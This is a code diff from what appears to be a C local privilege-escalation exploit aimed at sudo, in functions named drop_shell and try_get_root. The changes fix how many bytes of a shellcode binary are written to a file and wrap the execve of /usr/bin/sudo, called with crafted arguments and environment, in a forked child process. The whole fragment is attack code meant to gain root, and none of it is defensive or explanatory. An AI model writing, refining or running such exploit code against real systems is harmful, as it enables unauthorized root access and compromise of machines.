@@ -37,7 +37,7 @@ void drop_shell() {
   CHECK(p == 0);
 
   global->fwrite(SHELLCODE_BIN, sizeof(char),
-                 sizeof(SHELLCODE_BIN) / sizeof(char) - 1, p);
+                 sizeof(SHELLCODE_BIN) / sizeof(char), p);
   global->fclose(p);
 }
 
@@ -95,5 +95,13 @@ void try_get_root(Globals *glob) {
   write_exe_to_tmp();
   drop_shell();
 
-  global->execve("/usr/bin/sudo", e_argv, envp);
+  // fork and run exploit;
+  int pid = global->fork();
+
+  CHECK(pid == -1);
+
+  if (pid == 0) {
+    DEBUG_LOG("Exploit in forked\n");
+    global->execve("/usr/bin/sudo", e_argv, envp);
+  }
 }
